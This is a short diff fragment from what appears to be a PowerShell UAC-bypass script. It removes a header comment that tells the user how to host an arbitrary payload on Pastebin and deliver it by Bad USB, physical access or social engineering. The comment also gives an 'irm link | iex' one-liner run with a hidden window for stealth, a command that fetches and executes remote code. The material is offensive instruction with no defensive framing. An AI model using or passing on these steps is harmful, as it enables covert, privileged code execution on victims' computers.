@@ -1,16 +1,4 @@
-﻿# How to set-up the script:
-#   1. Paste whatever powershell script you want to execute after bypassing UAC in a PasteBin (Pastebin may block malicious powershell scripts) or Use some other text hosting solution/Use your own
-#   2. in Line 36, past the link to your txt (Needs to be Raw)
-#   3. From line 70-72, comment and uncomment as needed. Note: WindowStyle matters -- hidden will execute the powershell script in the background
-#   4. Method of Delivery:
-#     4.1 Physical Access utilizing USB Rubber Ducky / BAD USB.
-#     4.2 Physical Access utilizing manual execution
-#     4.3 Social Engineering
-#     4.4 RCE? I believe there was an RCE Vuln. in windows in IPV6, not sure how it worked or if it could even be leveraged to execute this powershell script
-#         If an RCE is found in the future that can be leveraged to execute this powershell script, physical access will not be required
-#   Tip:
-#     Host this script online after making necessary modification
-#     Leverage the Run command window (Win-R) to execute powershell with -C "irm 'LinkToThisScript' | iex" and the "-WindowStyle Hidden" flag for stealth
+﻿
 
 # Get the Desktop path
 try {
